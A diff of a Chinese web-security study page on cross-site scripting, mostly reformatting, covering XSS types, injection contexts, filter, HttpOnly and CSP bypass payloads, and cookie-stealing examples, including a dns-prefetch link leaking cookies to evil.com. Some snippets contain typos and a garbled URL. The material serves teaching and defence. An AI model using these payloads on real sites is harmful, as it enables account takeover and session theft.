-<h2 id="第三章-跨站脚本攻击"><a href="#第三章-跨站脚本攻击" class="headerlink" title="第三章 跨站脚本攻击"></a>第三章 跨站脚本攻击</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/600472299">学习指南</a></p>
+<h2 id="第三章-跨站脚本攻击">第三章 跨站脚本攻击</h2>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/600472299">学习指南</a></p>
 <p>DOM介绍：</p>
 <ul>
-<li>DOM 节点是指在 DOM 树中的对象，用于表示文档中的元素、属性、文本等内容。</li>
-<li>DOM 是 Document Object Model 的缩写，用于操作 HTML 或 XML 文档的接口，将文档视为树形结构，每个节点都是对象，可通过编程语言访问和修改属性与内容。</li>
-<li>常见的 DOM 节点类型包括文档节点、元素节点、属性节点、文本节点、注释节点。<ul>
+<li>DOM 节点是指在 DOM
+树中的对象，用于表示文档中的元素、属性、文本等内容。</li>
+<li>DOM 是 Document Object Model 的缩写，用于操作 HTML 或 XML
+文档的接口，将文档视为树形结构，每个节点都是对象，可通过编程语言访问和修改属性与内容。</li>
+<li>常见的 DOM
+节点类型包括文档节点、元素节点、属性节点、文本节点、注释节点。
+<ul>
 <li>文档节点表示整个文档，是 DOM 树的根节点。</li>
 <li>元素节点表示 HTML 或 XML 中的元素，可包含其他类型的节点。</li>
 <li>属性节点表示元素节点的属性，存储在元素的 attributes 属性中。</li>
 <li>文本节点表示元素或属性中的文本内容，不能包含子节点。</li>
 <li>注释节点表示文档中的注释，不能包含子节点。</li>
-</ul>
-</li>
+</ul></li>
 <li>示例 HTML 文档对应的 DOM 树中的节点关系。</li>
-<li>每个 HTML 成分对应 DOM 树中的节点，例如 <html> 元素是文档节点的子节点，<title> 元素是 <head> 元素的子节点等。</head></title></html></li>
+<li>每个 HTML 成分对应 DOM 树中的节点，例如
+<html>
+元素是文档节点的子节点，
+<title>
+元素是
+<head>
+元素的子节点等。</head></title></html></li>
 </ul>
-<h3 id="常见xss漏洞分类"><a href="#常见xss漏洞分类" class="headerlink" title="常见xss漏洞分类"></a>常见xss漏洞分类</h3><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>xss代码作为客户端输入的内容提交到服务端，服务端解析后，在响应内容中返回输入的xss代码，最终由浏览器解释执行</p>
-<h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h4><p>和反射型xss的区别主要在于提交的xss代码是否会存储在服务器端，比如，攻击者发布了一篇文章，包含了恶意xss语句，但是文章内容会被存到数据库中，其他用户点击该文章的时候，会从数据库中读取该文章的内容，浏览器就会对包含恶意代码的响应进行解析执行</p>
-<h4 id="DOM-xss"><a href="#DOM-xss" class="headerlink" title="DOM xss"></a>DOM xss</h4><p>触发XSS的是浏览器端的DOM解析，没有服务器端的直接参与</p>
+<h3 id="常见xss漏洞分类">常见xss漏洞分类</h3>
+<h4 id="反射型xss">反射型XSS</h4>
+<p>xss代码作为客户端输入的内容提交到服务端，服务端解析后，在响应内容中返回输入的xss代码，最终由浏览器解释执行</p>
+<h4 id="存储型xss">存储型xss</h4>
+<p>和反射型xss的区别主要在于提交的xss代码是否会存储在服务器端，比如，攻击者发布了一篇文章，包含了恶意xss语句，但是文章内容会被存到数据库中，其他用户点击该文章的时候，会从数据库中读取该文章的内容，浏览器就会对包含恶意代码的响应进行解析执行</p>
+<h4 id="dom-xss">DOM xss</h4>
+<p>触发XSS的是浏览器端的DOM解析，没有服务器端的直接参与</p>
 <p>比如源代码：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;area&quot;</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;area&quot;</span>).<span class="property">innerHTML</span>=<span class="built_in">unescape</span>(location.<span class="property">hash</span>);</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>代码中服务端未做任何操作，而客户端的js代码动态的将location.hash给了id为area的div，也就是我们输入网址：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/dom.heml#&lt;img src=x onerror=&#x27;alert(/xss/)&#x27;&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>#&lt;img src=x onerror=&#39;alert(/xss/)&#39;&gt;</code>会被放到div里面执行，由于x照片找不到，会执行我们的alert</p>
-<h4 id="输出在HTML标签里"><a href="#输出在HTML标签里" class="headerlink" title="输出在HTML标签里"></a>输出在HTML标签里</h4><p>关键：**<u>闭合</u>**</p>
+<p><code>#&lt;img src=x onerror='alert(/xss/)'&gt;</code>会被放到div里面执行，由于x照片找不到，会执行我们的alert</p>
+<h4 id="输出在html标签里">输出在HTML标签里</h4>
+<p>关键：<strong><u>闭合</u></strong></p>
 <p>eg源代码：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123;your input&#125;&#125;&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这时候输入<code>#&quot; onclick=&quot;alert(/xss/)</code>,或者输入<code>#&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</code></p>
-<h4 id="输出在CSS代码里"><a href="#输出在CSS代码里" class="headerlink" title="输出在CSS代码里"></a>输出在CSS代码里</h4><p>eg源代码：</p>
+<p>这时候输入<code>#" onclick="alert(/xss/)</code>,或者输入<code>#"&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;"</code></p>
+<h4 id="输出在css代码里">输出在CSS代码里</h4>
+<p>eg源代码：</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>=&#123;&#123;your <span class="selector-tag">input</span>&#125;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>输入：<code>#000;background-image:url(&#39;javascript:alert(/xss)&#39;)</code></p>
-<h4 id="输出在javascrit代码中"><a href="#输出在javascrit代码中" class="headerlink" title="输出在javascrit代码中"></a>输出在javascrit代码中</h4><p>eg源代码：</p>
+<p>输入：<code>#000;background-image:url('javascript:alert(/xss)')</code></p>
+<h4 id="输出在javascrit代码中">输出在javascrit代码中</h4>
+<p>eg源代码：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> name=<span class="string">&#x27;&#123;&#123;your input&#125;&#125;&#x27;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>输入：<code>&#39;+alert(/xss/)+&#39;</code></p>
-<h3 id="防护与绕过"><a href="#防护与绕过" class="headerlink" title="防护与绕过"></a>防护与绕过</h3><h4 id="特定标签过滤"><a href="#特定标签过滤" class="headerlink" title="特定标签过滤"></a>特定标签过滤</h4><p>比如过滤掉script，但是任何一种标签，无论是否合法都可以构造出xss代码，比如：</p>
+<p>输入：<code>'+alert(/xss/)+'</code></p>
+<h3 id="防护与绕过">防护与绕过</h3>
+<h4 id="特定标签过滤">特定标签过滤</h4>
+<p>比如过滤掉script，但是任何一种标签，无论是否合法都可以构造出xss代码，比如：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">not_real_tag</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">not_real_tag</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="事件过滤"><a href="#事件过滤" class="headerlink" title="事件过滤"></a>事件过滤</h4><p>比如过滤掉onclick,这时候就需要对所有可利用的事件属性进行遍历，测试开发者是否有遗漏，测试时可用burp或自行编写脚本进行爆破，另外还有一些标签属性本身不属于事件属性，但可用于执行javascript代码，比如常见的javascript伪协议：</p>
+<h4 id="事件过滤">事件过滤</h4>
+<p>比如过滤掉onclick,这时候就需要对所有可利用的事件属性进行遍历，测试开发者是否有遗漏，测试时可用burp或自行编写脚本进行爆破，另外还有一些标签属性本身不属于事件属性，但可用于执行javascript代码，比如常见的javascript伪协议：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="敏感关键字（字符）过滤"><a href="#敏感关键字（字符）过滤" class="headerlink" title="敏感关键字（字符）过滤"></a>敏感关键字（字符）过滤</h4><p>针对敏感变量或函数，比如：cookie、eval，这部分的过滤可通过字符串拼接、编码解码等方法进行绕过</p>
-<h5 id="字符串拼接与混淆"><a href="#字符串拼接与混淆" class="headerlink" title="字符串拼接与混淆"></a>字符串拼接与混淆</h5><p>要点：<strong>javascript中的对象方法可通过数组的方式进行调用</strong></p>
+<h4 id="敏感关键字字符过滤">敏感关键字（字符）过滤</h4>
+<p>针对敏感变量或函数，比如：cookie、eval，这部分的过滤可通过字符串拼接、编码解码等方法进行绕过</p>
+<h5 id="字符串拼接与混淆">字符串拼接与混淆</h5>
+<p>要点：<strong>javascript中的对象方法可通过数组的方式进行调用</strong></p>
 <p>如调用alert函数，可以使用如下方法：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>[<span class="string">&#x27;alert&#x27;</span>](<span class="regexp">/xss/</span>);</span><br><span class="line">进一步：</span><br><span class="line"><span class="variable language_">window</span>[<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert&#x27;</span>](<span class="regexp">/xss/</span>)</span><br><span class="line">进一步：</span><br><span class="line"><span class="variable language_">window</span>[<span class="title function_">atob</span>(<span class="string">&quot;YWxl&quot;</span>+<span class="string">&quot;cnQ=&quot;</span>)](<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>
-
-<p>btoa会把字符串编码为base64，atob会把base64还原为字符串，alert的base64编码为YWxlcnQ&#x3D;</p>
-<h5 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h5><p>通过各种编码实现xss注入</p>
+<p>btoa会把字符串编码为base64，atob会把base64还原为字符串，alert的base64编码为YWxlcnQ=</p>
+<h5 id="编码解码">编码解码</h5>
+<p>通过各种编码实现xss注入</p>
 <p>编码工具：</p>
 <p><a target="_blank" rel="noopener" href="https://evilcos.me/lab/xssee/">XSSEE</a></p>
-<h5 id="location-、window-name"><a href="#location-、window-name" class="headerlink" title="location.*、window.name"></a>location.*、window.name</h5><p>XSS有多种类型，其中一种是DOM-based XSS，也叫客户端XSS。这种类型的XSS是由于网页中的JavaScript代码从一个可控制的源（如URL、Cookie、本地存储等）获取数据，并将其传递给一个支持动态代码执行的汇（如eval()、innerHTML等）。这样就可以让攻击者在目标网页上执行任意的JavaScript代码。</p>
-<p>window.name和location.*是两个常见的DOM-based XSS的源，它们分别表示浏览器窗口的名称和当前网页的URL。攻击者可以通过修改这两个源中的数据，向目标网页中注入恶意的JavaScript代码片段。</p>
+<h5 id="location.window.name">location.*、window.name</h5>
+<p>XSS有多种类型，其中一种是DOM-based
+XSS，也叫客户端XSS。这种类型的XSS是由于网页中的JavaScript代码从一个可控制的源（如URL、Cookie、本地存储等）获取数据，并将其传递给一个支持动态代码执行的汇（如eval()、innerHTML等）。这样就可以让攻击者在目标网页上执行任意的JavaScript代码。</p>
+<p>window.name和location.*是两个常见的DOM-based
+XSS的源，它们分别表示浏览器窗口的名称和当前网页的URL。攻击者可以通过修改这两个源中的数据，向目标网页中注入恶意的JavaScript代码片段。</p>
 <p>避免开发者对输入的敏感关键字过滤，将xss代码防止与其他不被浏览器提交到服务器端的部分，比如<code>location.*</code>、<code>window.name</code>等处，<code>location.*</code>的构造如下:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/xss.php?input=&lt;input onfocus=outerHTML=decodeURI(location.hash)&gt;#&lt;img src=x onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
-
-<p> <code>onfocus</code>：这是一个事件属性，它指定了当用户将鼠标光标移动到链接上时要执行的 JavaScript 代码。在这里，要执行的代码是 <code>outerHTML=decodeURI(location.hash)</code> ，其中：</p>
-<p>•  <code>outerHTML</code>：这是一个属性，它表示当前元素（即超链接标签）的 HTML 代码。</p>
-<p>•  <code>decodeURI</code>：这是一个函数，它用于将一个编码过的 URI（统一资源标识符）转换为正常的字符串。</p>
-<p>•  <code>location.hash</code>：这是一个属性，它表示当前网页地址中跟在井号（#）后面的部分。</p>
-<p>•  <code>#&lt;img src=x onerror=alert(/xss/)&gt;</code>：这是一个井号后面跟着的一段 HTML 代码，它用于创建一个图像标签。</p>
+<p><code>onfocus</code>：这是一个事件属性，它指定了当用户将鼠标光标移动到链接上时要执行的
+JavaScript 代码。在这里，要执行的代码是
+<code>outerHTML=decodeURI(location.hash)</code> ，其中：</p>
+<p>•
+<code>outerHTML</code>：这是一个属性，它表示当前元素（即超链接标签）的
+HTML 代码。</p>
+<p>• <code>decodeURI</code>：这是一个函数，它用于将一个编码过的
+URI（统一资源标识符）转换为正常的字符串。</p>
+<p>•
+<code>location.hash</code>：这是一个属性，它表示当前网页地址中跟在井号（#）后面的部分。</p>
+<p>•
+<code>#&lt;img src=x onerror=alert(/xss/)&gt;</code>：这是一个井号后面跟着的一段
+HTML 代码，它用于创建一个图像标签。</p>
 <p>这段代码的作用和原理如下：</p>
-<p>•  首先，向服务器发送包含恶意 HTML 代码的页面请求或输入域。</p>
-<p>•  然后，服务器会将恶意 HTML 代码与正常的网页内容拼接起来，并返回给用户。</p>
-<p>•  接着，用户会看到一个指向 PHP 脚本文件并带有查询字符串参数的超链接。</p>
-<p>•  然后，当用户将鼠标光标移动到超链接上时，超链接标签会执行 onfocus 事件属性中指定的 JavaScript 代码。</p>
-<p>•  接着，<strong>JavaScript 代码会将超链接标签的 HTML 代码替换为当前网页地址中跟在井号后面的部分</strong>，并解码成正常的字符串。</p>
-<p>•  然后，用户会看到一个图像标签，并尝试加载图像。</p>
-<p>•  接着，由于图像的来源地址是不存在或无效的，图像加载失败，图像标签会执行 onerror 事件属性中指定的 JavaScript 代码。</p>
-<p>•  最后，JavaScript 代码会弹出一个对话框，并显示 xss 这个字符串。</p>
+<p>• 首先，向服务器发送包含恶意 HTML 代码的页面请求或输入域。</p>
+<p>• 然后，服务器会将恶意 HTML
+代码与正常的网页内容拼接起来，并返回给用户。</p>
+<p>• 接着，用户会看到一个指向 PHP
+脚本文件并带有查询字符串参数的超链接。</p>
+<p>• 然后，当用户将鼠标光标移动到超链接上时，超链接标签会执行 onfocus
+事件属性中指定的 JavaScript 代码。</p>
+<p>• 接着，<strong>JavaScript 代码会将超链接标签的 HTML
+代码替换为当前网页地址中跟在井号后面的部分</strong>，并解码成正常的字符串。</p>
+<p>• 然后，用户会看到一个图像标签，并尝试加载图像。</p>
+<p>•
+接着，由于图像的来源地址是不存在或无效的，图像加载失败，图像标签会执行
+onerror 事件属性中指定的 JavaScript 代码。</p>
+<p>• 最后，JavaScript 代码会弹出一个对话框，并显示 xss 这个字符串。</p>
 <p>window.name构造：</p>
 <p>攻击者可以使用window.open()函数打开一个新窗口，并在第二个参数中指定window.name的值。然后，目标网页可以使用eval(window.name)或类似的方法来执行window.name中的代码。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://example.com/xss.php?input%3Cinput%20onfocus=location=window.name%3E&quot;</span> <span class="attr">name</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这段代码会创建一个iframe，它指向一个存在DOM-based XSS漏洞的网页，并且在window.name中设置了alert(&#x2F;xss&#x2F;)这个代码片段。当用户点击iframe中的输入框时，就会触发onfocus事件，并执行window.name中的代码，从而弹出一个对话框。</p>
+<p>这段代码会创建一个iframe，它指向一个存在DOM-based
+XSS漏洞的网页，并且在window.name中设置了alert(/xss/)这个代码片段。当用户点击iframe中的输入框时，就会触发onfocus事件，并执行window.name中的代码，从而弹出一个对话框。</p>
 <p>iframe 标签，它用于创建一个内联框架，嵌入另一个网页或资源</p>
 <p>src：这是一个属性，它指定了 iframe 的来源地址</p>
-<p>?input&lt;input onfocus&#x3D;location&#x3D;window.name&gt;：这是一个查询字符串，它用于传递一个参数给 PHP 脚本文件。在这里，参数名是 input ，参数值是 &lt;input onfocus&#x3D;location&#x3D;window.name&gt; ，这是一个 HTML 标签，它用于创建一个输入域，并指定了当用户将鼠标光标移动到输入域上时要执行的 JavaScript 代码</p>
-<h5 id="过滤”-”"><a href="#过滤”-”" class="headerlink" title="过滤”.”"></a>过滤”.”</h5><p>用with：</p>
+<p>?input<input onfocus="location=window.name">：这是一个查询字符串，它用于传递一个参数给
+PHP 脚本文件。在这里，参数名是 input ，参数值是
+<input onfocus="location=window.name"> ，这是一个 HTML
+标签，它用于创建一个输入域，并指定了当用户将鼠标光标移动到输入域上时要执行的
+JavaScript 代码</p>
+<h5 id="过滤.">过滤"."</h5>
+<p>用with：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">with(document)alert(cookie)</span><br></pre></td></tr></table></figure>
-
-<h5 id="过滤”-”-1"><a href="#过滤”-”-1" class="headerlink" title="过滤”()”"></a>过滤”()”</h5><p>用throw：</p>
-<p>window.onerroe&#x3D;alert;throw 1;</p>
-<h5 id="过滤空格-1"><a href="#过滤空格-1" class="headerlink" title="过滤空格"></a>过滤空格</h5><p>可以用换行符0x09 0x10 0x12 0x13 0x0a等字符代替空格，在标签名称和第一个属性之间也可以用”&#x2F;“来代替空格：</p>
+<h5 id="过滤">过滤"()"</h5>
+<p>用throw：</p>
+<p>window.onerroe=alert;throw 1;</p>
+<h5 id="过滤空格-1">过滤空格</h5>
+<p>可以用换行符0x09 0x10 0x12 0x13
+0x0a等字符代替空格，在标签名称和第一个属性之间也可以用"/"来代替空格：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input/onfocus=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="svg标签"><a href="#svg标签" class="headerlink" title="svg标签"></a>svg标签</h5><h4 id="字符集编码导致的绕过"><a href="#字符集编码导致的绕过" class="headerlink" title="字符集编码导致的绕过"></a>字符集编码导致的绕过</h4><p>该类方法是通过字符集编码更换以绕过输出检查等</p>
-<h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><p>可以将要插入的恶意代码放置在window.name或者location.*里，或者使用注释</p>
+<h5 id="svg标签">svg标签</h5>
+<h4 id="字符集编码导致的绕过">字符集编码导致的绕过</h4>
+<p>该类方法是通过字符集编码更换以绕过输出检查等</p>
+<h4 id="长度限制">长度限制</h4>
+<p>可以将要插入的恶意代码放置在window.name或者location.*里，或者使用注释</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://example.com/xss.php?input=%3cinput%20onfocus=eval(window.name)%3E&quot;</span> <span class="attr">name</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="httponly绕过"><a href="#httponly绕过" class="headerlink" title="httponly绕过"></a>httponly绕过</h4><p>设置后可以在XSS漏洞发生时避免javascript读取到cookie</p>
-<h5 id="CVE-2012-0053"><a href="#CVE-2012-0053" class="headerlink" title="CVE-2012-0053"></a>CVE-2012-0053</h5><p>apache服务器爆出的漏洞，可以向网站植入超大的cookie，使得返回404，包含了cookie</p>
-<h5 id="PHPINFO页面"><a href="#PHPINFO页面" class="headerlink" title="PHPINFO页面"></a>PHPINFO页面</h5><p>该页面会输出当前请求上下文的Cookie信息</p>
-<h5 id="Flash-java"><a href="#Flash-java" class="headerlink" title="Flash&#x2F;java"></a>Flash&#x2F;java</h5><p>通过Flash，java的一些API可以获取到cookie</p>
-<h4 id="XSS-Auditor绕过"><a href="#XSS-Auditor绕过" class="headerlink" title="XSS Auditor绕过"></a>XSS Auditor绕过</h4><p>会检查输入的内容，但是可以通过字符集编码绕过，或者CRLF绕过：浏览器的XSS Auditor是默认打开的，但是如果HTTP响应头中的X-XSS-Protection属性被设置为0，就会关闭，在HTTP响应头中输入CRLF——X-XSS-Protection：0</p>
-<h4 id="内容安全策略（CSP）绕过"><a href="#内容安全策略（CSP）绕过" class="headerlink" title="内容安全策略（CSP）绕过"></a>内容安全策略（CSP）绕过</h4><p>以白名单的机制来管理网站要加载或执行的资源，但是CSP并不能防止数据泄露</p>
-<h5 id="CSP配置错误"><a href="#CSP配置错误" class="headerlink" title="CSP配置错误"></a>CSP配置错误</h5><h5 id="unsafe-inline下的绕过"><a href="#unsafe-inline下的绕过" class="headerlink" title="unsafe-inline下的绕过"></a>unsafe-inline下的绕过</h5><ul>
-<li><p>DNS Prefetch:由于link标签最新的rel属性dns-prefetch尚未被加入到csp实现中，可以利用</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=<span class="string">&quot;dns-prefetch&quot;</span> href=<span class="string">&quot;[cookie].evil.com&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>location.href:大部分的网站还是要依赖前端进行跳转，可利用</p>
-</li>
+<h4 id="httponly绕过">httponly绕过</h4>
+<p>设置后可以在XSS漏洞发生时避免javascript读取到cookie</p>
+<h5 id="cve-2012-0053">CVE-2012-0053</h5>
+<p>apache服务器爆出的漏洞，可以向网站植入超大的cookie，使得返回404，包含了cookie</p>
+<h5 id="phpinfo页面">PHPINFO页面</h5>
+<p>该页面会输出当前请求上下文的Cookie信息</p>
+<h5 id="flashjava">Flash/java</h5>
+<p>通过Flash，java的一些API可以获取到cookie</p>
+<h4 id="xss-auditor绕过">XSS Auditor绕过</h4>
+<p>会检查输入的内容，但是可以通过字符集编码绕过，或者CRLF绕过：浏览器的XSS
+Auditor是默认打开的，但是如果HTTP响应头中的X-XSS-Protection属性被设置为0，就会关闭，在HTTP响应头中输入CRLF——X-XSS-Protection：0</p>
+<h4 id="内容安全策略csp绕过">内容安全策略（CSP）绕过</h4>
+<p>以白名单的机制来管理网站要加载或执行的资源，但是CSP并不能防止数据泄露</p>
+<h5 id="csp配置错误">CSP配置错误</h5>
+<h5 id="unsafe-inline下的绕过">unsafe-inline下的绕过</h5>
+<ul>
+<li><p>DNS
+Prefetch:由于link标签最新的rel属性dns-prefetch尚未被加入到csp实现中，可以利用</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=<span class="string">&quot;dns-prefetch&quot;</span> href=<span class="string">&quot;[cookie].evil.com&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p>location.href:大部分的网站还是要依赖前端进行跳转，可利用</p></li>
 </ul>
-<h5 id="严苛规则-script-src-‘self’下的绕过"><a href="#严苛规则-script-src-‘self’下的绕过" class="headerlink" title="严苛规则 script-src ‘self’下的绕过"></a>严苛规则 script-src ‘self’下的绕过</h5><p>将script-src设置为某个目录，通过该目录的302跳转</p>
-<h5 id="CRLF导致的绕过"><a href="#CRLF导致的绕过" class="headerlink" title="CRLF导致的绕过"></a>CRLF导致的绕过</h5><p>在http响应头中注入<code>[CRLF][CRLF]</code>,将CSP头部分割至HTTP响应体中，这样注入的XSS代码便不再受到CSP的影响</p>
-<h3 id="危害与利用技巧"><a href="#危害与利用技巧" class="headerlink" title="危害与利用技巧"></a>危害与利用技巧</h3><p>XSS漏洞可以实现的危害包括但不限于：</p>
+<h5 id="严苛规则-script-src-self下的绕过">严苛规则 script-src
+'self'下的绕过</h5>
+<p>将script-src设置为某个目录，通过该目录的302跳转</p>
+<h5 id="crlf导致的绕过">CRLF导致的绕过</h5>
+<p>在http响应头中注入<code>[CRLF][CRLF]</code>,将CSP头部分割至HTTP响应体中，这样注入的XSS代码便不再受到CSP的影响</p>
+<h3 id="危害与利用技巧">危害与利用技巧</h3>
+<p>XSS漏洞可以实现的危害包括但不限于：</p>
 <ul>
 <li><p>窃取用户的cookie信息，伪造用户身份。这是XSS攻击最常见的目的之一，因为cookie通常包含了用户的登录凭证或其他敏感信息。如果攻击者能够获取到用户的cookie，就可以利用它来访问用户的账户或者进行其他恶意操作。例如，如果一个网站存在反射型XSS漏洞，攻击者可以构造一个包含如下代码的恶意链接：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>(); img.<span class="property">src</span> = <span class="string">&quot;6 + document.cookie;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这段代码会创建一个隐藏的图片元素，并将其src属性设置为一个恶意网站的地址，同时将当前页面的cookie作为参数传递过去。如果用户点击了这个链接，浏览器就会执行这段代码，并向恶意网站发送一个请求，从而泄露了用户的cookie信息。攻击者可以在恶意网站上收集这些信息，并利用它们来伪造用户身份。</p>
-</li>
+<p>这段代码会创建一个隐藏的图片元素，并将其src属性设置为一个恶意网站的地址，同时将当前页面的cookie作为参数传递过去。如果用户点击了这个链接，浏览器就会执行这段代码，并向恶意网站发送一个请求，从而泄露了用户的cookie信息。攻击者可以在恶意网站上收集这些信息，并利用它们来伪造用户身份。</p></li>
 <li><p>与浏览器DOM对象进行交互，执行受害者所有可以执行的操作。DOM对象是浏览器中用来表示和操作网页结构和内容的接口。如果攻击者能够通过XSS注入一些JavaScript代码到网页中，就可以利用DOM对象来改变网页的外观和行为，或者执行一些用户本身可以执行的操作。例如，如果一个网站存在存储型XSS漏洞，攻击者可以在留言板上发布一条包含如下代码的留言：</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.<span class="built_in">getElementById</span>(<span class="string">&quot;submit&quot;</span>).onclick = <span class="built_in">function</span>() &#123;<span class="built_in">alert</span>(<span class="string">&quot;你确定要提交吗？&quot;</span>);&#125;;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这段代码会修改提交按钮的点击事件，使得每当用户点击提交按钮时，都会弹出一个提示框。这样就可以干扰用户正常使用网站的功能，或者诱导用户做一些不想做的事情。</p>
-</li>
+<p>这段代码会修改提交按钮的点击事件，使得每当用户点击提交按钮时，都会弹出一个提示框。这样就可以干扰用户正常使用网站的功能，或者诱导用户做一些不想做的事情。</p></li>
